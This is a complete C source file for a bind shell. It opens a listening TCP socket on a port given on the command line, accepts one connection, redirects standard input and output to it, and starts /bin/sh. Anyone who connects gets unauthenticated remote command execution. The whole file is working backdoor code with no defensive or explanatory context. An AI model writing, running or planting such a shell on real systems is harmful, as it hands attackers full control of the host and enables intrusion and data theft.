#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <error.h>
#include <string.h>

int main(int argc,char ** argv){

	if(argc != 2){
		printf("[!] Usage : %s < port number >\n",argv[0]);
		exit(1);
	}
	struct sockaddr_in server;
	struct sockaddr_in client;
	int cfd,sfd;
	int sockaddrlen = sizeof(struct sockaddr_in);
	char *args[] = {"/bin/sh",0};

	if((sfd = socket(AF_INET,SOCK_STREAM,0)) == -1){
		perror("socket : ");
		exit(1);
	}

	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[1]));
	server.sin_addr.s_addr = INADDR_ANY;
	bzero(&server.sin_zero,0);

	if((bind(sfd,(struct sockaddr *)&server,sockaddrlen)) == -1){
		perror("bind : ");
		exit(1);
	}

	if((listen(sfd,0)) == -1){
		perror("listen : ");
		exit(1);
	}

	if((cfd = accept(sfd,NULL,NULL)) == -1){
		perror("accept : ");
		exit(1);
	}

	close(sfd);

	dup2(cfd,0);
	dup2(cfd,1);
	dup2(cfd,2);

	execve(args[0],&args[0],NULL);
}
